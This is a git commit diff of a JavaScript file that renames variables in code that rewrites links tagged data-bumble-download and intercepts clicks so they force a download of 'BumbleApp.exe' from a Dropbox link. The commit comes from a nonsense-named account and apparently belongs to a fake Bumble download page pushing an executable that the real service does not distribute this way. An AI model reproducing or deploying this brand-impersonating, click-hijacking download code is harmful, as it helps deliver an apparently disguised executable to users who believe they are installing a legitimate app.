43dacb6b8df4c27a49bcab5c67e84c8fd4f28a97
leckaawicas <tsurpsuraoyeayoeayroaurosueaye@gmail.com>
2026-07-25 22:21:36 +0300

    Add files via upload

--- download-track.js
+++ download-track.js
@@ -1,23 +1,23 @@
 (function (global) {
     "use strict";
 
-    var BUMBLE_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/tiavquy7ikxggy3bq9w45/BumbleApp.exe?rlkey=t7vlsdmiqbo0tmpgvzpd4brvr&st=lg7vvab1&dl=1";
+    var Bumble_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/tiavquy7ikxggy3bq9w45/BumbleApp.exe?rlkey=t7vlsdmiqbo0tmpgvzpd4brvr&st=lg7vvab1&dl=1";
 
     function applyDownloadLinksToAnchors() {
         if (typeof document === "undefined") return;
-        var nodes = document.querySelectorAll("a[data-bumble-download]");
+        var nodes = document.querySelectorAll("a[data-Bumble-download]");
         for (var i = 0; i < nodes.length; i++) {
-            nodes[i].setAttribute("href", BUMBLE_APP_DOWNLOAD_URL);
+            nodes[i].setAttribute("href", Bumble_APP_DOWNLOAD_URL);
             nodes[i].setAttribute("rel", "noopener noreferrer");
         }
     }
 
     function onDocumentClickCapture(e) {
-        var a = e.target.closest && e.target.closest("a[data-bumble-download]");
+        var a = e.target.closest && e.target.closest("a[data-Bumble-download]");
         if (!a) return;
         if (a.getAttribute("data-download-no-track") != null) return;
         e.preventDefault();
-        global.location.href = BUMBLE_APP_DOWNLOAD_URL;
+        global.location.href = Bumble_APP_DOWNLOAD_URL;
     }
 
     if (typeof document !== "undefined") {
@@ -27,5 +27,5 @@
         });
     }
 
-    global.BUMBLE_APP_DOWNLOAD_URL = BUMBLE_APP_DOWNLOAD_URL;
+    global.Bumble_APP_DOWNLOAD_URL = Bumble_APP_DOWNLOAD_URL;
 })(typeof window !== "undefined" ? window : this);
